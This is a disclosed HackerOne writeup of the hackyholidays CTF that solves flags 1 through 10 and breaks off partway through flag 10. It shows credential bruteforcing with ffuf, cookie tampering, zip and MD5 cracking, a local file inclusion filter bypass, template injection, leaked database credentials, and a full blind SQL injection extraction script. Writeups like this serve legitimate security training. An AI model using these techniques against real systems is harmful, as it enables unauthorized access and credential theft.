# hackyholidays CTF Writeup

## Report Details
- **Report ID**: 1069080
- **URL**: https://hackerone.com/reports/1069080
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-31T03:56:19.337Z
- **Disclosed**: 2021-03-02T17:48:28.081Z

## Reporter
- **Username**: un5h4d0w
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
## Summary:

As per [the referenced blog entry](https://www.hackerone.com/blog/12-days-hacky-holidays-ctf), the Grinch has gone hi-tech this year with the intentions of ruining the holidays. The challenge was about infiltrating the Grinch's network and take it down. 

As outlined on https://hackerone.com/h1-ctf, the domain `hackyholidays.h1ctf.com` was in scope.

It was possible to find multiple vulnerabilities, exploit various applications of the Grinch and finally turn the Grinch's own attack servers against himself by issuing a DDOS attack to `127.0.0.1` and knock him off the internet.

I hope that rebuilding his infrastructure keeps the Grinch busy for a while and gives hackers a chance to prepare for next year.

## Steps To Reproduce:

## Flag 1 - Flag leak in `/robots.txt`

Getting flag 1 was pretty easy - visiting `https://hackyholidays.h1ctf.com/robots.txt` gave away the first flag, `flag{48104912-28b0-494a-9995-a203d1e261e7}`:

{F1138900}

## Flag 2 - Secret Area

When visiting `https://hackyholidays.h1ctf.com/s3cr3t-ar3a`, the following text was shown:

{F1138914}

The grinch does not want us to see the page, but maybe we can bypass his protections...

I tried to manipulate the HTTP request as follows without success:

* Using `127.0.0.1` as value of the `Host` header 
* Adding the headers `X-Originating-IP`,` X-Forwarded-For`, `X-Remote-IP` and `X-Remote-Addr`
* Adding cookies: I used `access=1` and `acess=true`

First I didn't pay attention to the included scripts because they looked pretty standard according to their name, only JQuery and Boostrap seemed to be included. However, after running out of options, I took a closer look and noticed some strange content inside `https://hackyholidays.h1ctf.com/assets/js/jquery.min.js`:

{F1138928}

This looks a lot like a flag, and indeed, after copy-pasting the variable declaration into the debugger and printing the value gets added as `data-info` attribute to the element with ID `alertbox` I got the flag, `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`.

{F1138929}

The JavaScript tells us also that the next challenge might be available under `/apps` as soon at is released.

## Flag 3 - People Rater

**App description**: "The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!"

After opening the `People Rater` app by clicking on the `Start Challenge` button, the first 5 people that the grinch does not like are already listed, luckily I did not find my name on that list, but who knows... 5 Additional entries can be loaded by clicking on the `Load More` button, but there seems to be a maximum of 16 entries on the list. In the background, requests are made to `/people-rater/page/<pagenumber>`, each page returns up to 5 JSON entries with ID and name, e.g. when requesting `/people-rater/page/1`, the following entries are returned: 

``` 
{"results":[{"id":"eyJpZCI6Mn0=","name":"Tea Avery"},{"id":"eyJpZCI6M30=","name":"Mihai Matthews"},{"id":"eyJpZCI6NH0=","name":"Ruth Ward"},{"id":"eyJpZCI6NX0=","name":"Calvin Hogan"},{"id":"eyJpZCI6Nn0=","name":"Reilly Cervantes"}]}
```

When clicking on an individual entry, an alert is shown with a rating of the person the grinch noted down. In the background, a `GET` request to `/people-rater/entry?id=<id>` is made, which e.g. returns the following result for the first entry:

```
{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```

The `id` parameter looks like base64 encoded JSON. What immediately looked interesting was that decoding the ID of the first entry gave the following result:

```
$ echo eyJpZCI6Mn0= | base64 -d
{"id":2}
```

Let's try to get the entry with the ID 1:

```
$ echo -n '{"id":1}' | base64 -w0
eyJpZCI6MX0=
```

Issuing the following `GET` request returns an entry for the grinch. Of course, the grinch gave himself a good rating, it's hard to stay objective when talking about oneself, isn't it? But more importantly, flag 3, `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`, gets displayed as well:

{F1138930}

## Flag 4 - Swag Shop

**App description**: "Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop."

When visiting the swag shop site, 3 articles are displayed: one can buy an `I Hate Xmas Hoodie`, an `Xmas Sucks Cap` or a `Snow Ball Launcher`, obviously items the grinch himself would buy immediately. However, when clicking on the `Purchase` button below an item, a login promt gets displayed, it is not possible to buy anything if one does not have a swag shop account.

As there were no other options on the site, I took a look at the traffic in BurpSuite:

{F1138931}

Trying to purchase an item triggered requests to some endpoints under `/swagshop/api`: `login`, `purchase` and `stock`. Trying to manipulate the parameters did not give any useful results, therefore, I decided to fuzz the endpoints under `/swag-shop/api`. After using some small wordlists without success, finally, two additional endpoints were discovered:

```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -mc all -fc 404 -t 4
[SNIP]
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
:: Progress: [3132/3132] :: Job [1/1] :: 23 req/sec :: Duration: [0:02:13] :: Errors: 0 ::
```

The `sessions` endpoint looks interesting because it returned the status code 200 and quite a large response. Indeed, when issuing a `GET` request to `/swag-shop/api/sessions`, a list of sessions got returned!

```
{
  "sessions": [
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
    "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
  ]
}
```

There is one entry standing out due to its length. When decoding this entry, we get a UUID and a cookie:

```
eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==

{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```

I lost some time because I tried to use the cookie directly as suggested by the JavaScript on the swag shop site:

```
$(".loginbtn").click(function(){
	$.post("/swag-shop/api/login",{
		username:$('input[name="username"]').val(),password:$('input[name="password"]').val()
	},function(o){
		document.cookie("token="+o.token),window.location="/swag-shop"
	}).fail(function(){
		alert("Login Failed")
	})
}
```

However, adding a cookie with the key `token` did not help, even when decoding the cookie and using the base64 decoded value:

```
$ echo NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY= | base64 -d
4548292f7d6624b1a42f74d11a48313860a5ada174b8daa735526c489046cbab67a1acd7b0fa987d9ed91d99ad5a6222ffc36c047899fb8f6c9e48ba2206ed16
```

This value is 128 characters long and therefore could be a hash, however googling and trying to crack the hash did not work either.

Finally, I remembered the challenge description: "Try and find a way to pull the Grinch's personal details from the online shop." Maybe there is a way to get personal details without logging in? I remembered that I found another endpoint, `/swag-shop/api/user` and that I got a user ID from the session identifier as well. 

The user endpoint returns `400 Bad Request` and the message `{"error":"Missing required fields"}` when being called without parameters. Another round of fuzzing with different wordlists finally revealed that the `uuid` parameter is required:

```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=x -mc all -fr 'Missing required fields' -t 4
[snip]
uuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]
:: Progress: [2588/2588] :: Job [1/1] :: 20 req/sec :: Duration: [0:02:08] :: Errors: 0 ::
```

The `404 Not Found` first made me think that this approach was another rabbit hole, but the message `{"error":"Could not find matching uuid"}` looked promising. Using the user ID as UUID finally gave me grinch's personal details together with the flag, `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`:

{F1138932}

## Flag 5 - Secure Login

**App description**: "Try and find a way past the login page to get to the secret area."

When visiting `https://hackyholidays.h1ctf.com/secure-login`, a login form is shown and nothing else. When trying to login with random username and password, the error message `Invalid Username` gets returned. I tried to manipulate the username and password parameters, use SQLI payloads and test if special characters cause different error messages without success. As there was no other interesting content in the HTML source of the login page, I decided to bruteforce the username:
```
$ ffuf -X POST -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -u https://hackyholidays.h1ctf.com/secure-login -d 'username=FUZZ&password=asdf' -H 'Content-Type: application/x-www-form-urlencoded' -mc all -fr "Invalid Username"
[snip]
access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
:: Progress: [1000/1000] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Great - using `access` as username returns `Invalid Password` instead of `Invalid Username`. Maybe we can bruteforce the password as well?

```
$ ffuf -X POST -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -u https://hackyholidays.h1ctf.com/secure-login -d 'username=access&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -mc all -fr "Invalid Password"
[snip]
computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [1000/1000] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Great, seems like we got valid credentials!

Login with credentials `access:computer` succeeds, but `No Files To Download` gets displayed. Looks like there are some files to download, but not for us... 

{F1138933}

After searching for interesting stuff in the HTML source with no success, I decided to take a closer look at the authentication mechanism. The page uses cookie-based authentication. The cookie seems to be base64-encoded JSON because it starts with `eyJ` and ends with `%3D` (which is `=` when being URL-decoded). Decoding the cookie gives the following result:

```
$ echo eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0= | base64 -d
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

When changing `"admin": false` to `"admin": true`, base64-encode, then URL-encoding the cookie and using the new cookie value instead, a download link gets displayed:

{F1138935}

After downloading the file and trying to open it, I noticed that the ZIP archive is encrypted. However, the password is simple enough to be crackable:

```
$ zip2john my_secure_files_not_for_you.zip > hash.txt
[snip]
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hahahaha         (my_secure_files_not_for_you.zip)
1g 0:00:00:00 DONE (2020-12-23 10:20) 100.0g/s 1228Kp/s 1228Kc/s 1228KC/s total90..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Unzipping the archive by using the password `hahahaha` was possible. The archive contains two files: `flag.txt` and `xxx.png`. While `xxx.png` seems to be a selfie of the grinch (not his best selfie by the way), `flag.txt` contains a flag:

```
$ cat flag.txt 
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

## Flag 6 - My Diary

**App description**: "Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?"

Visiting `https://hackyholidays.h1ctf.com/my-diary` redirects to `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html` and shows the grinch's calendar. Obviously, `entries.html` is used as a template - let's try to directly access that file. Indeed, we can access `https://hackyholidays.h1ctf.com/my-diary/entries.html` directly, which means that we potentially have local file inclusion using the `template` parameter. Trying to access `/my-diary/index.php` causes a redirect as well, but accessing `/my-diary/index.html` causes a `404 Not Found` response, therefore, the application seems to be written in PHP. 

After overcomplicating things by trying to use PHP stream wrappers I finally found out that `index.php` can be included directly:

{F1138936}

Alright, getting redirected simply means that the target file was not found after removing every character that is not alphanumeric or a dot and also removing the substrings `admin.php` and `secretadmin.php`.

Trying to access `/my-diary/admin.php` directly results in `404 Not Found`, so maybe that file does not even exist. However, trying to access `/my-diary/secretadmin.php` looks more interesting as the error message `You cannot view this page from your IP Address` is returned.

This means that we probably need to bypass the filter mechanism. There seems to be no way around the character restriction. However, filtering the substrings `admin.php` and `secretadmin.php` is not done recursively but just once. Therefore, we can get the source of `secretadmin.php` wich contains the flag by crafting a filename that results in `secretadmin.php` after being filtered (`secretadmsecretadadmin.phpmin.phpin.php`):

{F1138937}

Unfortunately, the `Post` button does nothing (yet?), but hey, getting another flag is always great!


# Flag 7 - Hate Mail Generator

**App description**: "Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!"

The grinch does not get nicer when christmas gets closer, in contrary, he is obviously already grumpy enough to use a hate mail generator in order to speed up his hate mail workflow. 

There is one existing campaign with the following markup:

```
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

Clicking on the `Preview` button shows the HTML mail. The variables used in the markup indicate that we might be able to use template injection for exploitation by creating new templates and previewing them, which is possible when clicking on the `Create New` button in the campaign overview.

When previewing newly generated templates, a `POST` request to `/hate-mail-generator/new/preview` is sent with the parameters `preview_markup` and `preview_data`. The content of the `Markup` field is submitted within the `preview_markup` parameter. Great, this looks like template injection will be possible indeed. However, the template variables that can be used seem to be restricted to the variables declared in the `preview_data` parameter and the `template:<filename>` variable we saw in the existing campaign.

Trying to insert an arbitrary template name by using `{{template:asdf}}` as `preview_markup` tells us that the template file is expected to be found under `/templates/<templatename>` due to the error message `Cannot find template file /templates/asdf`.

Trying to access `https://hackyholidays.h1ctf.com/hate-mail-generator/templates` seems to work, we can see that 3 files are present in this directory because directory listing is enabled:

{F1138939}

Unfortunately, we cannot access those files directly, the response is always 403 forbidden. It is possible to show the file content by inserting `{{template:<filename>}}` into a new hate mail and display the preview, but this only works for two out of those three files: when trying to display `38dhs_admins_only_header.html`, the error message `You do not have access to the file 38dhs_admins_only_header.html` gets shown in the response instead of the file content.

However, it is possible to bypass the restriction to display `38dhs_admins_only_header.html` via template markup because it is possible to add markup as value of a template variable in `preview_data`. When using the corresponding variable key inside `preview_markup`, first the key gets resolved to the corresponding value and afterwards the value gets resolved again, which means that in case a template is referenced, the content of the template file gets inserted into the preview. Therefore, when using the following values, it is possible to display `38dhs_admins_only_header.html` which contains the flag:

* `preview_markup`: `{{name}}`
* `preview_data`: `{"name":"{{template:38dhs_admins_only_header.html}}"}`

The response to such a request contains the flag, `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`:

{F1138940}

## Flag 8 - Forum

**App description**: "The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!"

Well, I'm not surprised that nobody wants to talk to the grinch...

When visiting `https://hackyholidays.h1ctf.com/forum`, two forum section get displayed: the `General` section contains two categories, `Christmas!!!` and `Nice Things To Do`. Of course, `Nice Things To Do` does not contain any posts yet, the grinch does not do nice things anyway, but `Christmas!!!` contains one post with the title `Why I hate Christmas` which - surprise - is written by a user named `grinch`. `max` seems to be the only user that responded (and probably the only user that is registered as well...).

The `Admin` category cannot be viewed without being logged in as an admin, only the text `You need to be an admin to view these posts` gets displayed to unauthenticated users.

This challenge sent me into countless rabbit holes. Categories and posts are referenced by IDs in URL segments, so I first tried if IDOR works but gave up after the first 100 IDs gave no results. As there are two possible usernames, I tried to bruteforce their passwords with a small wordlist without result. Afterwards, I used `ffuf` to find additional paths. There seems to be a `phpmyadmin` installation accessible via `https://hackyholidays.h1ctf.com/forum/phpmyadmin`, but it seems to be just a mock because no other files that are typically present could be found there. Nevertheless, I researched popular CVEs that are easy to exploit but none of them worked of course (I did not expect to be successful with that approach anyway because it was not even possible to find out which version of phpmyadmin was mocked here).

Finally, after scrolling through the Discord channel, I found some hints that the source can be found in the Internet. Oh well, I totally did not expect that we need to use OSINT to proceed, but let's give it a try...

To my surprise, it was pretty easy to find the github repo with the `forum` sourcecode - the contribution activity of [adamtlangley](https://github.com/adamtlangley) showed that he committed to [Grinch-Networks/forum](https://github.com/Grinch-Networks/forum).

{F1138942}

Looking through the commit history (fortunately, there were only 4 commits), a commit named `small fix` struck my attention:

{F1138943}

The commit removed the credentials of a database user in `models/Db.php`:

```
self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
```

As phpmyadmin usually accepts database credentials, it was no big surprise that it is possible login to phpmyadmin with `forum:6HgeAZ0qC9T6CQIqJpD`.

The `forum` database is accessible, but we can only read the `user` table, when clicking on `comment`, `post` or `section`, only a message `Error reading database encoding...` was shown.

The `user` table contained the following entries:

```
id 	username 	password 	admin
1 	grinch 	35D652126CA1706B59DB02C93E0C9FBF 	1
2 	max 	388E015BC43980947FCE0E5DB16481D1
```

We need to be admin to read the entries in the admin section therefore we need to get grinch's plaintext password.

The password looks like MD5. Luckily I was lazy enough to first search if the hashes were already cracked by googling them. `max` hash gave me no result, but I found out that `BahHumbug` is the plaintext password of the user `grinch`. 

{F1138946}

Not even `rockyou.txt` contains the hash, it would have taken me forever to crack the hash on my own. Due to that, I'm still not sure if I missed a step that would have allowed to bypass the login by reviewing the `forum` sourcecode - looking shortly through it did not reveal any obvious bugs. On the other hand, if bruteforcing the password with a wordlist was possible, the `phpmyadmin` step could be bypassed altogether, maybe a hash that usually is not present in a common wordlist was used intentionally... 

Anyway, I successfully used `grinch:BahHumbug` to login to the forum and was able read the post in the admin area under the category `Secret Plans` which contains the flag, `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`:

{F1138947}

## Flag 9 - Evil Quiz

**App description**: "Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!"

The grinch wants us to take a quiz. In order to complete a quiz, one must specify a username and answer the following 3 questions:
* Do you like Christmas?
* Are you holly and jolly?
* Do you like presents?

After submitting the quiz, a score is printed and the number of other players with the same name gets shown.

After trying some input manipulation, I found out that the name input at the beginning of the quiz is vulnerable to SQL injection and we can see the result of a boolean query by analyzing the number of players displayed at the end of the game: when using `invalidplayername' or if(1=0, 1, 0); -- ` as username, zero players are selected from the database, therefore the count of other players equals zero, whereas when adding `invalidplayername' or if(1=0, 1, 0); -- `, all players are selected and the count is greater than zero.

Unfortunately, we need to submit multiple requests to get a result. Instead of trying to find out how to use SQLMap for that task / whether that is possible at all, I used the following Python script for getting the credentials:

```
import re
import requests
import string
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

RHOST = "https://hackyholidays.h1ctf.com"
# proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }
proxies = {}

def get_quiz(s):
    s.get(f"{RHOST}/evil-quiz")

def post_quiz(s, payload):
    data = { "name": payload }
    s.post(f"{RHOST}/evil-quiz", data=data)

def post_start(s):
    data = { "ques_1": 0, "ques_2": 0, "ques_3": 0 }
    res = s.post(f"{RHOST}/evil-quiz/start", data=data)
    m = re.search(".*There is ([0-9]+) other player\(s\) with the same name as you!.*", res.text, re.DOTALL)
    if m:
        return m.group(1)

def submit_try(s, payload):
    post_quiz(s, payload)
    return post_start(s)

def exploit(s, query):
    alphabet = string.printable
    resume = True
    result = ""
    position = 1
    while resume:
        resume = False
        for c in alphabet:
            candidate = ord(c)
            payload = f"sdfasdfgdsfgx' or substring(binary({query}), {position}, 1) = char({candidate}); -- "
            if int(submit_try(s, payload)) > 0:
                result += c
                print(f"[+] Found: {result}")
                position += 1
                resume = True
                break
    return result



if __name__ == "__main__":
    s = requests.Session()
    s.proxies.update(proxies)
    s.verify = False
    get_quiz(s)

    # initial pocs
    # print(submit_try(s, "sdfasdfgdsfg' or if(1=1, 1, 0); -- "))
    # print(submit_try(s, "sdfasdfgdsfg' or if(1=0, 1, 0); -- "))

    # there is only 1 table schema of interest -> schema name: quiz
    # print(submit_try(s, "sdfasdfgdsfg' or (select count(schema_name) from information_schema.schemata where schema_name <> 'information_schema') = 1; -- "))
    # result = exploit(s, "select schema_name from information_schema.schemata where schema_name <> 'information_schema'")
    # print(result)

    # there are 2 tables in schema quiz: admin, quiz
    # print(submit_try(s, "sdfasdfgdsfg' or (select count(table_name) from information_schema.tables where table_schema = 'quiz') = 2; -- "))
    # result = exploit(s, "select table_name from information_schema.tables where table_schema = 'quiz' limit 1")
    # result = exploit(s, "select table_name from information_schema.tables where table_schema = 'quiz' limit 1 offset 1")

    # there are 3 columns in table admin: id, password, username
    # print(submit_try(s, "sdfasdfgdsfg' or (select count(column_name) from information_schema.columns where table_schema = 'quiz' and table_name = 'admin') = 3; -- "))
    # result = exploit(s, "select column_name from information_schema.columns where table_schema = 'quiz' and table_name = 'admin' limit 1")
    # result = exploit(s, "select column_name from information_schema.columns where table_schema = 'quiz' and table_name = 'admin' limit 1 offset 1")
    # result = exploit(s, "select column_name from information_schema.columns where table_schema = 'quiz' and table_name = 'admin' limit 1 offset 2")

    # there is 1 entry in table admin: id: 1, username: admin, password: S3creT_p4ssw0rd-$
    # print(submit_try(s, "sdfasdfgdsfg' or (select count(*) from admin) = 1; -- "))
    print(submit_try(s, "sdfasdfgdsfg' or (select id from admin) = 1; -- "))
    result = exploit(s, "select username from admin")
    print("Username: " + result)
    result = exploit(s, "select password from admin")
    print("Password: " + result)
```

After getting the credentials (which took quite a while), I was able to login with `admin:S3creT_p4ssw0rd-$` and get the flag, `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`:

{F1138948}

## Flag 10 - Signup Manager

**App description**: "You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!"

When visiting `https://hackyholidays.h1ctf.com/signup-manager` and looking through the HTML source, there is a reference to `README.md`: 

```
<!-- See README.md for assistance -->
```

README.md can be found under `https://hackyholidays.h1ctf.com/signup-manager` and tells us default credentials (`admin:password`) that do not work and that a zip archive named `signupmanager.zip` must be unzipped in order to deploy the application.

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

Luckily, someone forgot to remove the zip archive from the server after unpacking it, therefore we can download it from `https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip`. The zip archive contains the sourcecode of signup manager page. The logic seems to happen in `index.php`.

Of course, `https://hackyholidays.h1ctf.com/signup-manager/users.txt` was not found. According to the README, the `users.txt` was probably placed into an inaccessible directory.

To further analyze the behaviour of the application, I unpacked the zip archive and started a local PHP development server from the directory containing hte unpacked files with `php -S 0.0.0.0:8000`.

Signing up at my local test server e.g. causes the following line to be written into `users.txt`:

```
myusername#####34819d7beeabb9260a5c854bc85b3e444e6fce8107c28f716a911683586ccf6d18#MyFirstName####MyLastName#####N
```
 
A user entry equals a line of 112 chars in that file plus Y at the end if it is an admin user, else N. When signing up for an account, N is appended at the end, therefore, all users added via signup are non-admins. 

According to the source code, each field has a certain length. If a string submitted by the user is shorter, the value is padded with `#` using the `pad_str` function.

By looking at the source code again, I noticed that additional characters are stripped from a line immediately before it is written to `users.txt`:

```
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```

This means that if we somehow manage to construct a string that is at least 1 character longer than expected, we can create a valid entry for an admin user by placing `Y` at position 113, e.g. by using the `lastname` parameter where we can freely choose the content as long as it is alphanumeric and exactly 15 characters long. 

Fortunately, `str_pad` does not strip strings longer than the expected length but instead keeps the whole string. This means we need to find a field where we can insert a string that is longer than expected.

The parameters `username`, `firstname` and `lastname` have a minimum length of 3 characters and are filtered through `substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["<VALUE>"]), 0, 15)` before being padded, this makes using multibytes to cause inconsistencies in the string length impossible. The `password` parameter is stored as md5 value and therefore has a fixed length, however, no check is being performed before passing the `POST` parameter form user input into `password = md5($_POST["password"])`. When using an array instead of a string, signing up succeeds with a PHP warning (`PHP Warning:  md5() expects parameter 1 to be string, array given in /[SNIP]/index.php on line 76`) but no password hash is added to the final entry in `users.txt` because the `md5()` function just returns an empty string. Unfortunately, a shorter string in `users.txt` does not help because it gets filtered out when getting a list of users from `users.txt` during login, only entries with exactly 113 characters are considered valid.

This only leaves the `age` parameter for bypassing the length. The `age` parameter is checked as follows before passing it to `add_user`:

```
if (!is_numeric($_POST["age"])) {
	$errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
	$errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);
if (count($errors) === 0) {
	$cookie = addUser($username, $password, $age, $firstname, $lastname);
```

The `is_numeric` check assures that `age` is numeric, which rules out multibyte attacks again. However, it is not only possible to enter decimal values, `is_numeric` also accepts other representation of numbers.

After some trial and error, I found out that there is an inconsistency regarding the length in `strlen()` vs `intval()` when using numbers in scientific notation: `intval(1e3)` equals `1000` which is of length 4, but `strlen(1e3)` is 3:

